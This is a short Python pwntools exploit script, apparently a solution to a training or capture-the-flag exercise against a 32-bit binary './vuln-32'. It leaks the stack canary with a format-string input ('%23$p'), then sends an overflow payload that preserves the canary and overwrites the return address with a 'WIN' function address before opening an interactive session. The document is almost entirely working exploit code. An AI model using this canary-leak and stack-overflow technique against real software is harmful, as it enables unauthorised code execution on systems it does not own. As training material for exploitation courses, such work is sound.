from pwn import *
from time import sleep

EX_NAME = './vuln-32'

elf = ELF(EX_NAME)
context.arch = 'x86'
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    # p = remote('leakers.training.offensivedefensive.it', 8080, ssl=True)
    print('NO REMOTE!')
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug(EX_NAME, api=True, gdbscript='''
        c
        ''')
    else:
        p = elf.process()

def dbg_stop():
    if 'GDB' in os.environ:
        input('Waiting...')

WIN = 0x08049245

sleep(0.5)
log.info(p.clean())

# Leak canary.
sleep(0.5)
p.sendline(b'%23$p')

sleep(0.5)
canary = p.clean()
log.info(canary)
canary = int(canary.split(b'\n')[0], 16)
log.success(f'canary: {hex(canary)}')

# Overflow.
sleep(0.5)
p.sendline(b'A'*64 + p32(canary) + b'B'*12 + p32(WIN))

sleep(0.5)
log.success(p.clean())

sleep(0.5)
p.interactive()
